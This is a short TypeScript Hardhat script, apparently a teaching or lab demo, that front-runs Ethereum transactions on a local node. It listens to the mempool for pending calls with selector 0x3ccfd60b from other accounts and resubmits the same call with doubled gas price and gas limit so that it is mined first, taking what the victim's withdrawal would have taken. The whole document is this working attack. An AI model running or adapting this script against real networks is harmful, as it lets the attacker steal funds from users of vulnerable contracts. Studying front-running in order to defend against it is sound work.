import { ethers } from "hardhat";

(async () => {
  const url = "ws://localhost:8545";
  const [, , signer] = await ethers.getSigners();
  const address = await signer.getAddress();

  await new Promise<void>((resolve, reject) => {
    const provider = new ethers.providers.WebSocketProvider(url)
      .on("error", reject)
      .on("pending", async (hash) => {
        try {
          const tx = await provider.getTransaction(hash);
          if (tx.data !== "0x3ccfd60b") return;
          if (tx.from === address) return;

          console.log("Overtaking transaction...");

          await signer
            .sendTransaction({
              to: tx.to,
              data: tx.data,
              gasLimit: tx.gasLimit?.mul(2),
              gasPrice: tx.gasPrice?.mul(2),
            })
            .then((response) => response.wait());

          await provider.destroy();

          resolve();
        } catch (err) {
          provider
            .destroy()
            .then(() => reject(err))
            .catch(reject);
        }
      });

    console.log("Waiting for transaction...");
  });
})()
  .then(() => console.log("Done"))
  .catch(console.error);
